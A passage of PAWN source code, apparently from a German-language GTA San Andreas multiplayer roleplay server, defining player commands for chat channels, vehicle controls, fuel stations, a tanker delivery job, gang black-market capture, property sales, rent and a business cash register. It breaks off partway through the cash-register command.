cmd:help(playerid,params[]) return CallLocalFunction("cmd_hilfe","d",playerid);
cmd:hilfe(playerid,params[])
{
    printf("%s hilfe",PlayerName(playerid));
	ShowPlayerDialog(playerid, DIALOG_HILFE, DIALOG_STYLE_LIST, "Hilfe zum Server", "Allgemeine Hilfe\nFahrzeughilfe\nHaus/Geschäftshilfe\nJob Hilfe\nFraktionshilfe\nAllgemeine Befehle", "Weiter", "Abbrechen");
    return 1;
}
cmd:chat(playerid,params[])
{
    printf("%s chat",PlayerName(playerid));
	new string[20];
	if(sscanf(params,"s[20]",string)) if(IstSpielerInFrak(playerid,6)) { return SendClientMessage(playerid,COLOR_RED,"Benutze /chat [Fraktion(f),Local(l),Schreien(s),Nachrichten(n)]"); } else { return SendClientMessage(playerid,COLOR_RED,"Benutze /chat [Fraktion(f),Local(l),Global(g),Schreien(s)]"); }
    if(strcmp(string,"Local", true) == 0 || strcmp(string,"l", true) == 0)
	{
		Channel[playerid] = 0;
		SendClientMessage(playerid,COLOR_GREEN,"Du schreibst im normalen Chat nun Local!");
	}
	else if(strcmp(string,"Fraktion", true) == 0 || strcmp(string,"f", true) == 0)
	{
		Channel[playerid] = 1;
		SendClientMessage(playerid,COLOR_GREEN,"Du schreibst im normalen Chat nun in deiner Fraktion!");
	}
	else if(strcmp(string,"Schreien", true) == 0 || strcmp(string,"s", true) == 0)
	{
		Channel[playerid] = 3;
		SendClientMessage(playerid,COLOR_GREEN,"Du schreist nun im normalen Chat!");
	}
	else if(strcmp(string,"Nachrichten", true) == 0 || strcmp(string,"n", true) == 0)
	{
	    if(IstSpielerInFrak(playerid,6))
		{
			Channel[playerid] = 4;
			SendClientMessage(playerid,COLOR_GREEN,"Du schreibst nun Nachrichten im normalen Chat!");
		}
		else return SendClientMessage(playerid,COLOR_RED,"Benutze /chat [Fraktion(f),Local(l),Global(g),Schreien(s)]");
	}
	else return SendClientMessage(playerid,COLOR_RED,"Benutze /chat [Fraktion(f),Local(l),Global(g),Schreien(s)]");
	return 1;
}
cmd:verstauen(playerid,params[])
{
    printf("%s verstauen",PlayerName(playerid));
    if(in_event[playerid] == true)return SendClientMessage(playerid,COLOR_RED,"Dieser Befehl ist hier nicht möglich!");
	new verstaumuni;
	if(sscanf(params,"d",verstaumuni)) return SendClientMessage(playerid,COLOR_RED,"Benutze /verstauen [Munition]");
	new waffenid = GetPlayerWeapon(playerid), muni = GetPlayerAmmo(playerid);
	if(verstaumuni < 1) return SendClientMessage(playerid,COLOR_RED,"Du kannst nicht weniger als einmal Munition verstauen!");
	if(waffenid != 0 && muni > 0)
	{
	    if(verstaumuni > muni) return SendClientMessage(playerid,COLOR_RED,"So viel Munition hast du nicht!");
	    if(!Verstauen(playerid,waffenid,verstaumuni)) return SendClientMessage(playerid,COLOR_RED,"Inventar voll!");
	}
	else return SendClientMessage(playerid,COLOR_RED,"Diese Waffe kannst du nicht verstauen!");
	return 1;
}
cmd:editattach(playerid,params[])
{
    printf("%s editattach",PlayerName(playerid));
    EditAttachedObject(playerid,9);
    return 1;
}
public OnPlayerEditAttachedObject(playerid, response, index, modelid, boneid, Float:fOffsetX, Float:fOffsetY, Float:fOffsetZ, Float:fRotX, Float:fRotY, Float:fRotZ, Float:fScaleX, Float:fScaleY, Float:fScaleZ)
{
    if(response)
    {
        printf("SetPlayerAttachedObject(playerid, %d, %d, %d, %.3f, %.3f, %.3f, %.3f, %.3f, %.3f);",index, modelid, boneid, fOffsetX, fOffsetY, fOffsetZ, fRotX, fRotY, fRotZ);
    }
    return 1;
}
cmd:licht(playerid,params[])
{
    printf("%s licht",PlayerName(playerid));
    if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid,COLOR_RED,"Das kann nur der Fahrer!");
	new engine,lights,alarm,doors,bonnet,boot,objective,veh = GetPlayerVehicleID(playerid);
	GetVehicleParamsEx(veh,engine,lights,alarm,doors,bonnet,boot,objective);
	if(lights == VEHICLE_PARAMS_OFF || lights == -1)
	{
	    SetVehicleParamsEx(veh,engine,VEHICLE_PARAMS_ON,alarm,doors,bonnet,boot,objective);
	    for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && IsPlayerInVehicle(i,GetPlayerVehicleID(playerid)))
	    {
	        PlayerTextDrawSetString(i, TachoText[i][9], "Licht: ~g~ein");
	    }
	}
	else
	{
	    SetVehicleParamsEx(veh,engine,VEHICLE_PARAMS_OFF,alarm,doors,bonnet,boot,objective);
	    for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && IsPlayerInVehicle(i,GetPlayerVehicleID(playerid)))
	    {
	        PlayerTextDrawSetString(i, TachoText[i][9], "Licht: ~r~aus");
	    }
	}
    return 1;
}
cmd:motor(playerid,params[])
{
    printf("%s motor",PlayerName(playerid));
    if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid,COLOR_RED,"Das kann nur der Fahrer!");
    if(IstEinKeinFuehrerscheinFahrzeug(GetPlayerVehicleID(playerid))) return 1;
	new engine,lights,alarm,doors,bonnet,boot,objective,veh = GetPlayerVehicleID(playerid);
	GetVehicleParamsEx(veh,engine,lights,alarm,doors,bonnet,boot,objective);
	if(Motorschaden2[GetPlayerVehicleID(playerid)] == 0)
	{
		if(engine == VEHICLE_PARAMS_OFF || engine == -1)
		{
			if(Benzin[veh] == 0) return GameTextForPlayer(playerid,"~n~~n~~n~~n~~n~~n~~n~~n~~r~Tank leer",1500,3);
		    SetVehicleParamsEx(veh,VEHICLE_PARAMS_ON,lights,alarm,doors,bonnet,boot,objective);
		    for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && IsPlayerInVehicle(i,GetPlayerVehicleID(playerid)))
		    {
		        PlayerTextDrawSetString(i, TachoText[i][8], "Motor: ~g~ein");
		    }
		}
		else
		{
		    SetVehicleParamsEx(veh,VEHICLE_PARAMS_OFF,lights,alarm,doors,bonnet,boot,objective);
		    for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && IsPlayerInVehicle(i,GetPlayerVehicleID(playerid)))
		    {
		       PlayerTextDrawSetString(i, TachoText[i][8], "Motor: ~r~aus");
		    }
		}
	}
	else
	{
	    SendClientMessage(playerid,COLOR_RED,"Das Fahrzeug hat einen Motorschaden. Rufe das Fire & Rescue Department mit /service!");
	}
    return 1;
}
cmd:motorhaube(playerid,params[])
{
    printf("%s motorhaube",PlayerName(playerid));
    if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid,COLOR_RED,"Das kann nur der Fahrer!");
	new engine,lights,alarm,doors,bonnet,boot,objective;
	GetVehicleParamsEx(GetPlayerVehicleID(playerid),engine,lights,alarm,doors,bonnet,boot,objective);
   	if(bonnet == VEHICLE_PARAMS_OFF || bonnet == -1)
   	{
		SetVehicleParamsEx(GetPlayerVehicleID(playerid),engine,lights,alarm,doors,VEHICLE_PARAMS_ON,boot,objective);
	}
	else
	{
		SetVehicleParamsEx(GetPlayerVehicleID(playerid),engine,lights,alarm,doors,VEHICLE_PARAMS_OFF,boot,objective);
	}
    return 1;
}
cmd:kofferraum(playerid,params[])
{
    printf("%s kofferraum",PlayerName(playerid));
    if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid,COLOR_RED,"Das kann nur der Fahrer!");
	new engine,lights,alarm,doors,bonnet,boot,objective;
	GetVehicleParamsEx(GetPlayerVehicleID(playerid),engine,lights,alarm,doors,bonnet,boot,objective);
   	if(boot == VEHICLE_PARAMS_OFF || boot == -1)
   	{
		SetVehicleParamsEx(GetPlayerVehicleID(playerid),engine,lights,alarm,doors,bonnet,VEHICLE_PARAMS_ON,objective);
	}
	else
	{
		SetVehicleParamsEx(GetPlayerVehicleID(playerid),engine,lights,alarm,doors,bonnet,VEHICLE_PARAMS_OFF,objective);
	}
    return 1;
}
cmd:tankpreis(playerid,params[])
{
	if(SpielerInfo[playerid][uGeschaeftschluessel] == 10 || SpielerInfo[playerid][uGeschaeftschluessel] == 11 || SpielerInfo[playerid][uGeschaeftschluessel] == 12)
	{
	    new Kraftstoff[20],Float:kosten,string[200];
	    if(sscanf(params,"s[10]f",Kraftstoff,kosten)) return SendClientMessage(playerid,COLOR_RED,"Benutze /tankpreis [Benzin/Diesel] [Preis je Liter]");
        if(strcmp(Kraftstoff,"Diesel",true) == 0)
        {
            if(kosten > 0.01)
            {
                if(kosten < 5.0)
                {
                    if(SpielerInfo[playerid][uGeschaeftschluessel] == 10)
                    {
                        format(string,sizeof(string),"Diesel: %.2f$",kosten);
						SetDynamicObjectMaterialText(Tankstelle3, 2, string, 90, "Arial", 24, 1, 0xFFFFFFFF, 0xFF2D3A35, 1);
						BizInfo[10][bdieselpreis] = kosten;
						Geschaftspeichern(10);
                    }
					else if(SpielerInfo[playerid][uGeschaeftschluessel] == 11)
					{
					    format(string,sizeof(string),"Diesel: %.2f$",kosten);
						SetDynamicObjectMaterialText(Tankstelle1, 2, string, 90, "Arial", 24, 1, 0xFFFFFFFF, 0xFF2D3A35, 1);
						BizInfo[11][bdieselpreis] = kosten;
						Geschaftspeichern(11);
					}
					else if(SpielerInfo[playerid][uGeschaeftschluessel] == 12)
					{
					    format(string,sizeof(string),"Diesel: %.2f$",kosten);
						SetDynamicObjectMaterialText(Tankstelle2, 2, string, 90, "Arial", 24, 1, 0xFFFFFFFF, 0xFF2D3A35, 1);
						BizInfo[12][bdieselpreis] = kosten;
						Geschaftspeichern(12);
					}
					SendFormatMessage(playerid,COLOR_GREEN,"Dieselpreis auf %.2f$ geändert!",kosten);

				}else SendClientMessage(playerid,COLOR_RED,"Die kosten je Liter können nicht über 5$ sein!");
            }else SendClientMessage(playerid,COLOR_RED,"Die kosten je Liter müssen über 0.01$ sein!");
        }
        else if(strcmp(Kraftstoff,"Benzin",true) == 0)
        {
            if(kosten > 0.01)
            {
                if(kosten < 5)
                {
                    if(SpielerInfo[playerid][uGeschaeftschluessel] == 10)
                    {
						format(string,sizeof(string),"Benzin: %.2f$",kosten);
						SetDynamicObjectMaterialText(Tankstelle3, 3,string, 90, "Arial", 24, 0, 0xFFFFFFFF, 0xFF193826, 1);
						BizInfo[10][bbenzinpreis] = kosten;
						Geschaftspeichern(10);
                    }
					else if(SpielerInfo[playerid][uGeschaeftschluessel] == 11)
					{
						format(string,sizeof(string),"Benzin: %.2f$",kosten);
						SetDynamicObjectMaterialText(Tankstelle1, 3,string, 90, "Arial", 24, 0, 0xFFFFFFFF, 0xFF193826, 1);
						BizInfo[11][bbenzinpreis] = kosten;
						Geschaftspeichern(11);
					}
					else if(SpielerInfo[playerid][uGeschaeftschluessel] == 12)
					{
						format(string,sizeof(string),"Benzin: %.2f$",kosten);
						SetDynamicObjectMaterialText(Tankstelle2, 3,string, 90, "Arial", 24, 0, 0xFFFFFFFF, 0xFF193826, 1);
						BizInfo[12][bbenzinpreis] = kosten;
						Geschaftspeichern(12);
					}
					SendFormatMessage(playerid,COLOR_GREEN,"Benzinpreis auf %.2f$ geändert!",kosten);

				}else SendClientMessage(playerid,COLOR_RED,"Die kosten je Liter können nicht über 5$ sein!");
            }else SendClientMessage(playerid,COLOR_RED,"Die kosten je Liter müssen über 0.01$ sein!");
        }
	}
 	else
 	{
 	    SendClientMessage(playerid,COLOR_RED,"Du besitzt keine Tankstelle!");
 	}
	return 1;
}
cmd:tanken(playerid,params[])
{
    printf("%s tanken",PlayerName(playerid));
	//Weg
	//
    new string[100],Kraftstoff[10],menge,veh,konto = 0,engine,lights,alarm,doors,bonnet,boot,objective;
	if(sscanf(params,"s[10]d",Kraftstoff,menge)) return SendClientMessage(playerid,COLOR_RED,"Benutze /tanken [Benzin/Diesel] [Menge]");
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,COLOR_RED,"Du bist in keinem Fahrzeug!");
	veh = GetPlayerVehicleID(playerid);
	if(IsPlayerInRangeOfPoint(playerid,5,2491.7346,-9310.8467,4.6030) || IsPlayerInRangeOfPoint(playerid,5,5391.0366,-9283.8418,4.4064)|| IsPlayerInRangeOfPoint(playerid,5,5404.0713,-9283.9775,4.4044)|| IsPlayerInRangeOfPoint(playerid,5,6308.3369,-7836.9707,4.4133)|| IsPlayerInRangeOfPoint(playerid,5,6295.3154,-7837.0610,4.4113))
	{
	    if(IsPlayerInRangeOfPoint(playerid,5,2491.7346,-9310.8467,4.6030))
	    {
	        welchetanke[playerid] = 11;//ls
	    }
	    else if(IsPlayerInRangeOfPoint(playerid,5,5391.0366,-9283.8418,4.4064))
	    {
	        welchetanke[playerid] = 12;//lv
	    }
	    else if(IsPlayerInRangeOfPoint(playerid,5,5404.0713,-9283.9775,4.4044))
	    {
	        welchetanke[playerid] = 12;//lv
		}
		else if(IsPlayerInRangeOfPoint(playerid,5,6308.3369,-7836.9707,4.4133))
		{
		    welchetanke[playerid] = 10;//sf
		}
		else if(IsPlayerInRangeOfPoint(playerid,5,6295.3154,-7837.0610,4.4113))
		{
		    welchetanke[playerid] = 10;//sf
		}
		GetVehicleParamsEx(veh,engine,lights,alarm,doors,bonnet,boot,objective);
		if(engine == VEHICLE_PARAMS_ON) return SendClientMessage(playerid,COLOR_RED,"Schalte deinen Motor aus um zu tanken!");
		if(Benzin[veh]+menge > AutoDaten[GetVehicleModel(veh)-399][MaxBenzin])
		{
	 		format(string,sizeof string,"So viel passt nicht in deinen Tank, du kannst maximal %d Liter tanken!",AutoDaten[GetVehicleModel(veh)-399][MaxBenzin]-Benzin[veh]);
	   		SendClientMessage(playerid,COLOR_RED,string);
	   		return 1;
		}
		if(menge < 1) return SendClientMessage(playerid,COLOR_RED,"Du kannst nicht weniger als einen Liter tanken!");
		if(strcmp(Kraftstoff,"Diesel",true) == 0)
		{
		    if(AutoDaten[GetVehicleModel(veh)-399][aKraftstoff] == 0)
		    {
				if(SpielerInfo[playerid][uGeld] < menge*BizInfo[welchetanke[playerid]][bdieselpreis])
				{
					if(SpielerInfo[playerid][uKonto] < menge*BizInfo[welchetanke[playerid]][bdieselpreis]) return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");
		   			KontoGeld(playerid,-menge*BizInfo[welchetanke[playerid]][bdieselpreis],"Fahrzeug betankt.");
		 			konto = 1;
				}
				else
				{
					GebeGeld(playerid,-menge*BizInfo[welchetanke[playerid]][bdieselpreis]);
				}
				format(string,sizeof string,"Du hast %d Liter Diesel für %.2f$ gekauft.",menge,menge*BizInfo[welchetanke[playerid]][bdieselpreis]);
				SendClientMessage(playerid,COLOR_GREEN,string);
				BizInfo[welchetanke[playerid]][bkasse] += menge*BizInfo[welchetanke[playerid]][bdieselpreis];Geschaftspeichern(welchetanke[playerid]);
				if(konto == 1) SendClientMessage(playerid,COLOR_GREEN,"Da du nicht genug Geld dabei hast, wurde dein Konto mit den Kosten belastet!");
				Benzin[veh]+=menge;
				format(string, sizeof(string), "%d/%dL",Benzin[veh],AutoDaten[GetVehicleModel(veh)-399][MaxBenzin]);
				PlayerTextDrawSetString(playerid,TachoText[playerid][14],string);
				BenzinVerbrauch[veh] = 0;
			}else{SendClientMessage(playerid,COLOR_RED,"Dieses Fahrzeug tankt kein Diesel!");}
		}
		else if(strcmp(Kraftstoff,"Benzin",true) == 0)
		{
		    if(AutoDaten[GetVehicleModel(veh)-399][aKraftstoff] == 1)
		    {
				if(SpielerInfo[playerid][uGeld] < menge*BizInfo[welchetanke[playerid]][bbenzinpreis])
				{
					if(SpielerInfo[playerid][uKonto] < menge*BizInfo[welchetanke[playerid]][bbenzinpreis]) return SendClientMessage(playerid,COLOR_RED,"Du hast nicht genug Geld!");
		   			KontoGeld(playerid,-menge*BizInfo[welchetanke[playerid]][bbenzinpreis],"Fahrzeug betankt.");
				    konto = 1;
				}
				else
				{
					GebeGeld(playerid,-menge*BizInfo[welchetanke[playerid]][bbenzinpreis]);
				}
				format(string,sizeof string,"Du hast %d Liter Benzin für %.2f$ gekauft.",menge,menge*BizInfo[welchetanke[playerid]][bbenzinpreis]);
				SendClientMessage(playerid,COLOR_GREEN,string);
				BizInfo[welchetanke[playerid]][bkasse] += menge*BizInfo[welchetanke[playerid]][bbenzinpreis]; Geschaftspeichern(welchetanke[playerid]);
				if(konto == 1) SendClientMessage(playerid,COLOR_GREEN,"Da du nicht genug Geld dabei hast, wurde dein Konto mit den Kosten belastet!");
				Benzin[veh]+=menge;
				format(string, sizeof(string), "%d/%dL",Benzin[veh],AutoDaten[GetVehicleModel(veh)-399][MaxBenzin]);
				PlayerTextDrawSetString(playerid,TachoText[playerid][14],string);
				BenzinVerbrauch[veh] = 0;
			}else{SendClientMessage(playerid,COLOR_RED,"Dieses Fahrzeug tankt kein Benzin!");}
		}
		else
		{
			SendClientMessage(playerid,COLOR_RED,"Benutze /tanken [Benzin/Diesel] [Menge]");
		}
	}else{SendClientMessage(playerid,COLOR_RED,"Du bist an keiner Zapfsäule!");}
	return 1;
}
cmd:abfuellen(playerid,params[])
{
	if(TruckSpritmodus[playerid] == 33 || TruckSpritmodus[playerid] == 34 || TruckSpritmodus[playerid] == 35)
	{
	    new veh = GetPlayerVehicleID(playerid);
	    if(GetVehicleModel(veh) == 514 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER || GetVehicleModel(veh) == 403 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER || GetVehicleModel(veh) == 515 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		{
		    if(IsTrailerAttachedToVehicle(veh))
		    {
				if(IsPlayerInRangeOfPoint(playerid,10,2490.1226,-9312.2168,4.4000) && TruckSpritmodus[playerid] == 33) //LS
				{
					BizInfo[11][bSprit] += 100;
					Geschaftspeichern(11);
					SendClientMessage(playerid,COLOR_GREEN,"Tankstelle befüllt! Du bekommst 320$ Bringe das Fahrzeug zurück oder mache weiter mit /trucker");
					GebeGeld(playerid,320);
					vehicleprodukte[playervehiclemerk[playerid]] = 0;
					playervehiclemerk[playerid] = -1;
				    PlayerTrucker[playerid] = 0;
				    PlayerTruckmodus[playerid] = 0;
				    PlayerProdukt[playerid] = 0;
				    TruckSpritmodus[playerid] = 0;
					DisablePlayerCheckpoint(playerid);
				}
				else if(IsPlayerInRangeOfPoint(playerid,10,5396.8203,-9283.1270,4.4064) && TruckSpritmodus[playerid] == 34)//LV
				{
				    BizInfo[12][bSprit] += 100;
					Geschaftspeichern(12);
					SendClientMessage(playerid,COLOR_GREEN,"Tankstelle befüllt! Du bekommst 320$ Bringe das Fahrzeug zurück oder mache weiter mit /trucker");
					GebeGeld(playerid,320);
					vehicleprodukte[playervehiclemerk[playerid]] = 0;
					playervehiclemerk[playerid] = -1;
				    PlayerTrucker[playerid] = 0;
				    PlayerTruckmodus[playerid] = 0;
				    PlayerProdukt[playerid] = 0;
				    TruckSpritmodus[playerid] = 0;
				    DisablePlayerCheckpoint(playerid);
				}
				else if(IsPlayerInRangeOfPoint(playerid,10,6302.0615,-7838.3169,4.4113) && TruckSpritmodus[playerid] == 35)//SF
				{
				    BizInfo[10][bSprit] += 100;
					Geschaftspeichern(10);
					SendClientMessage(playerid,COLOR_GREEN,"Tankstelle befüllt! Du bekommst 320$ Bringe das Fahrzeug zurück oder mache weiter mit /trucker");
					GebeGeld(playerid,320);
					vehicleprodukte[playervehiclemerk[playerid]] = 0;
					playervehiclemerk[playerid] = -1;
				    PlayerTrucker[playerid] = 0;
				    PlayerTruckmodus[playerid] = 0;
				    PlayerProdukt[playerid] = 0;
				    TruckSpritmodus[playerid] = 0;
				    DisablePlayerCheckpoint(playerid);
				}else {SendClientMessage(playerid,COLOR_RED,"Du bist nicht an der passenden Tankstelle!");}
            }
			else
			{
				SendClientMessage(playerid,COLOR_RED,"JOB BEENDET: Du hast keinen Anhänger angehängt");
		        vehicleprodukte[playervehiclemerk[playerid]] = 0;
				playervehiclemerk[playerid] = -1;
			    PlayerTrucker[playerid] = 0;
			    PlayerTruckmodus[playerid] = 0;
			    PlayerProdukt[playerid] = 0;
			    TruckSpritmodus[playerid] = 0;
			    DisablePlayerCheckpoint(playerid);
			}
		}else {SendClientMessage(playerid,COLOR_RED,"Du bist in keinem Truck!");}
 	}else {SendClientMessage(playerid,COLOR_RED,"Dein Truck hat keinen Sprit beladen!");}
	return 1;
}
cmd:einnehmen(playerid,params[])
{
    printf("%s einnehmen",PlayerName(playerid));
	if(!IstSpielerInFrak(playerid,8) && !IstSpielerInFrak(playerid,9) && !IstSpielerInFrak(playerid,10) && !IstSpielerInFrak(playerid,11)) return SendClientMessage(playerid,COLOR_RED,"Du bist bei keiner Gang/Mafia!");
	for(new x = 0; x < sizeof(Schwarzmarkt); x++)
	{
	    if(IsPlayerInDynamicArea(playerid,Schwarzmarkt[x][sZone]))
	    {
			if(IstSpielerInFrak(playerid,Schwarzmarkt[x][sBesitzer])) return SendClientMessage(playerid,COLOR_RED,"Dieser Schwarzmarkt gehört bereits deiner Fraktion!");
			if(Schwarzmarkt[x][sEinnahmeZeit] != 0) return SendClientMessage(playerid,COLOR_RED,"Dieser Schwarzmarkt wurde vor kurzem erst eingenommen!");
			if(FraktionsUserOnline(Schwarzmarkt[x][sBesitzer]) < 1) return SendClientMessage(playerid,COLOR_RED,"Es ist keiner der Besitzerfraktion online!");
			new string[70],frak;
			if(SpielerInfo[playerid][uLeiter] == 0) frak = SpielerInfo[playerid][uMitglied];
			else frak = SpielerInfo[playerid][uLeiter];
			if(Schwarzmarkt[x][sBesitzer] != -1)
			{
				Schwarzmarkt[x][sEinnahmeZeit] = 2100;
				Schwarzmarkt[x][sAngreifer] = frak;
				Schwarzmarkt[x][sBesitzerKills] = 0;
				Schwarzmarkt[x][sAngreiferKills] = 0;
				format(string,sizeof string,"Die %s greifen den Schwarzmarkt %s an.",Fraktionen[frak],Schwarzmarkt[x][sZoneName]);
				FraktionsNachricht(Schwarzmarkt[x][sBesitzer],COLOR_LIGHTBLUE,string);
				format(string,sizeof string,"Wir greifen den Schwarzmarkt %s der %s an.",Schwarzmarkt[x][sZoneName],Fraktionen[Schwarzmarkt[x][sBesitzer]]);
				FraktionsNachricht(frak,COLOR_LIGHTBLUE,string);
				for(new i = 0; i < MAX_PLAYERS; i++)
				{
					if(IsPlayerInDynamicArea(i,Schwarzmarkt[x][sZone]))
					{
		      		  	if(IstSpielerInFrak(i,Schwarzmarkt[x][sBesitzer]))
	          			{
					       	PlayerTextDrawBoxColor(i,Gangfight[i][4],GangColor[Schwarzmarkt[x][sBesitzer]-8]);
					       	PlayerTextDrawBoxColor(i,Gangfight[i][5],GangColor[Schwarzmarkt[x][sAngreifer]-8]);
					       	for(new y = 0; y < sizeof(Gangfight[]); y++)
	    					{
			     		   		PlayerTextDrawShow(i,Gangfight[i][y]);
			      		  	}
        				}
			        	else
			        	{
				        	PlayerTextDrawBoxColor(i,Gangfight[i][4],GangColor[Schwarzmarkt[x][sAngreifer]-8]);
					       	PlayerTextDrawBoxColor(i,Gangfight[i][5],GangColor[Schwarzmarkt[x][sBesitzer]-8]);
					       	for(new y = 0; y < sizeof(Gangfight[]); y++)
	    					{
			     		   		PlayerTextDrawShow(i,Gangfight[i][y]);
			      		  	}
			        	}
    		  		}
      		  	}
				return 1;
			}
			else
			{
			    Schwarzmarkt[x][sBesitzer] = frak;
			    format(string,sizeof string,"Schwarzmarkt %s eingenommen.",Schwarzmarkt[x][sZoneName]);
				FraktionsNachricht(frak,COLOR_LIGHTBLUE,string);
				new string2[3];
		        format(string,sizeof string,"ID='%d'",x);
		        format(string2,sizeof string2,"%d",Schwarzmarkt[x][sBesitzer]);
		        mysqlupdate("schwarzmarkt",string,"Besitzer",string2);
			    return 1;
			}
		}
	}
	SendClientMessage(playerid,COLOR_RED,"Du befindest dich an keinem Schwarzmarkt!");
	return 1;
}
cmd:verkaufen(playerid,params[])
{
    printf("%s verkaufen",PlayerName(playerid));
	new typ[10],string[150];
	if(sscanf(params,"s[10]",typ)) return SendClientMessage(playerid,COLOR_RED,"Benutze /verkaufen [Haus | Geschaeft]");
	if(strcmp(typ,"haus",true) == 0)
	{
	    if(SpielerInfo[playerid][uHausschluessel] == -1) return SendClientMessage(playerid,COLOR_RED,"Du besitzt kein Haus!");
		new id = SpielerInfo[playerid][uHausschluessel];
		SpielerInfo[playerid][uHausschluessel] = -1;
		HausInfo[id][hBesitzer] = -1;
		GebeGeld(playerid,HausInfo[id][hPreis]);
		if(HausInfo[id][hHotel] == 0)
		{
			HausInfo[id][hSchild] = CreateDynamicObject(19471,HausDaten[id][hSchildX],HausDaten[id][hSchildY],HausDaten[id][hSchildZ],HausDaten[id][hSchildRX],HausDaten[id][hSchildRY],HausDaten[id][hSchildRZ]);
			format(string,sizeof string,"Haus für %.2f$ verkauft.",HausInfo[id][hPreis]);
			SendClientMessage(playerid,COLOR_GREEN,string);
			new pppname[MAX_PLAYER_NAME];
			GetPlayerName(playerid,pppname,sizeof(pppname));
			format(HausInfo[id][hName],MAX_PLAYER_NAME,"Der Staat");
			format(string,sizeof string,"Hausnummer: %d\nBesitzer: %s",HausInfo[id][sphnummer],HausInfo[id][hName]);
   			SetDynamicObjectMaterialText(HausInfo[id][hNummer],0,string,OBJECT_MATERIAL_SIZE_256x128,"Arial",23,1,0xFFFFFFFF,0x3C3C3CFF,OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
            HausInfo[id][Schildlabel] = Create3DTextLabel("{FAFAFA}Benutze {FF5A00}'H'{FAFAFA} zum agieren",0xFFFFFF,HausDaten[id][hSchildX],HausDaten[id][hSchildY],HausDaten[id][hSchildZ]+0.4,10.0,0,0);
            SpielerInfo[playerid][uSpawn] = 0;
   			SendClientMessage(playerid,COLOR_YELLOW,"Dein Spawnort wurde geändert: Letzte Position! Ändere dein Spawnort mit /spawns");
			for(new x = 0; x < MAX_INVENTAR; x++)
	        {
	            if(Moebel[id][x] > 0)
	            {
		        	DestroyDynamicObject(Moebel[id][x]);
		        	Moebel[id][x] = -1;
	        	}
	        }
	        Moebelanzahl[id] = 0;
		}
		else
		{
		    SendClientMessage(playerid,COLOR_GREEN,"Du bist nun nicht mehr im Hotelzimmer eingemietet und erhälst deine Anzahlung von 200$ zurück!");
		}
		HausSpeichern(id);
	}
	else if(strcmp(typ,"geschaeft",true) == 0)
	{
	    if(SpielerInfo[playerid][uGeschaeftschluessel] == -1) return SendClientMessage(playerid,COLOR_RED,"Du besitzt kein Geschäft!");
		new id = SpielerInfo[playerid][uGeschaeftschluessel];
		SpielerInfo[playerid][uGeschaeftschluessel] = -1;
		BizInfo[id][bbesitzer] = -1;
		GebeGeld(playerid,BizInfo[id][bpreis]);
		BizInfo[id][bSchild] = CreateDynamicObject(19471,BizDaten[id][bSchildX],BizDaten[id][bSchildY],BizDaten[id][bSchildZ],BizDaten[id][bSchildRX],BizDaten[id][bSchildRY],BizDaten[id][bSchildRZ]);
		format(string,sizeof string,"Geschäft für %.2f$ verkauft.",BizInfo[id][bpreis]);
		SendClientMessage(playerid,COLOR_GREEN,string);
		new pppname[MAX_PLAYER_NAME];
		GetPlayerName(playerid,pppname,sizeof(pppname));
		format(BizInfo[id][bname],MAX_PLAYER_NAME,"Der Staat");
		format(string,sizeof string,"Geschäftsnummer: %d\nBesitzer: %s",BizInfo[id][bnummer],BizInfo[id][bname]);
		SetDynamicObjectMaterialText(BizInfo[id][bNummers],0,string,OBJECT_MATERIAL_SIZE_256x128,"Arial",23,1,0xFFFFFFFF,0x3C3C3CFF,OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
		Geschaftspeichern(id);
	}
	else
	{
		SendClientMessage(playerid,COLOR_RED,"Benutze /verkaufen [Haus/Geschaeft]");
	}
 	return 1;
}

cmd:miete(playerid,params[])
{
    printf("%s miete",PlayerName(playerid));
	if(SpielerInfo[playerid][uHausschluessel] == -1 || HausInfo[SpielerInfo[playerid][uHausschluessel]][hBesitzer] != SpielerInfo[playerid][uID]) return SendClientMessage(playerid,COLOR_RED,"Du besitzt kein eigenes Haus!");
	new Float:miete,string[50];
	if(sscanf(params,"f",miete)) return SendClientMessage(playerid,COLOR_RED,"Benutze /miete [Preis]");
	if(miete < 0.01 || miete > 1000) return SendClientMessage(playerid,COLOR_RED,"Die Miete muss zwischen 1Cent und 1000$ liegen!");
	HausInfo[SpielerInfo[playerid][uHausschluessel]][hMiete] = miete;
	HausSpeichern(SpielerInfo[playerid][uHausschluessel]);
	format(string,sizeof string,"Miete erfolgreich in %.2f$ geändert.",miete);
	SendClientMessage(playerid,COLOR_GREEN,string);
	return 1;
}

cmd:kasse(playerid,params[])
{
    printf("%s kasse",PlayerName(playerid));
	new string[100],Float:betrag;
	if(sscanf(params,"s[100]",string)) return SendClientMessage(playerid,COLOR_RED,"Benutze /kasse [Einzahlen/Auszahlen/Betrag]");
	if(SpielerInfo[playerid][uGeschaeftschluessel] == -1) return SendClientMessage(playerid,COLOR_RED,"Du besitzt kein Geschäft!");
	new id = SpielerInfo[playerid][uGeschaeftschluessel];
   	if(strfind(string,"Einzahlen",true) == 0)
	{
	    sscanf(params,"s[100]f",string,betrag);
	    if(betrag == 0) return SendClientMessage(playerid,COLOR_RED,"Benutze: /kasse Einzahlen [Betrag]");
		if(betrag > SpielerInfo[playerid][uGeld]) return SendClientMessage(playerid,COLOR_RED,"So viel Geld hast du nicht!");
		if(betrag < 0.01) return SendClientMessage(playerid,COLOR_RED,"Du kannst nicht weniger als 0.01$ einzahlen!");
		GebeGeld(playerid,-betrag);
		BizInfo[id][bkasse] += betrag+0.01;
		format(string,sizeof string,"Du hast %.2f$ in die Geschäftskasse getan.",betrag+0.001);
		SendClientMessage(playerid,COLOR_GREEN,string);
	}
	else if(strfind(string,"Auszahlen",true) == 0)
	{
